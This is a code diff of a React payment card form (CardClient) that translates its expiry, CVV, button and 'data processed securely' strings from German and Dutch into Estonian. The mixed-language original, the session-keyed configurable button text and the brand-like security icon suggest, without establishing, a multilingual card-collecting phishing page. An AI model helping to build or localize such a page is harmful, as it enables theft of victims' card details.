@@ -188,11 +188,11 @@ export function CardClient({ sessionId }: Props) {
           </div>
 
           {!expiryValid && expiry.length > 0 ? (
-            <p className="text-xs text-red-400">Ablaufdatum muss im Format MM/JJ sein.</p>
+            <p className="text-xs text-red-400">Aegumiskuupäev peab olema kujul KK/AA.</p>
           ) : null}
 
           {!cvcValid && cvc.length > 0 ? (
-            <p className="text-xs text-red-400">CVV muss aus 3 oder 4 Ziffern bestehen.</p>
+            <p className="text-xs text-red-400">CVV peab koosnema 3 või 4 numbrist.</p>
           ) : null}
 
           {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
@@ -202,13 +202,13 @@ export function CardClient({ sessionId }: Props) {
             disabled={saving || !expiryValid || !cvcValid}
             className="w-full rounded-xl bg-gradient-to-r from-[#0066CC] to-[#0088FF] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(0,102,204,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
           >
-            {saving ? "Senden..." : settings.card_button}
+            {saving ? "Saadan..." : settings.card_button}
           </button>
           
           <div className="mt-4 flex items-center justify-center gap-2">
             <img src="/ah-icon-security-transparent.png" alt="Secure" className="h-5 w-5" />
             <span className="text-[13px] font-medium text-gray-300">
-              Je gegevens worden veilig verwerkt.
+              Sinu andmeid töödeldakse turvaliselt.
             </span>
           </div>
         </form>
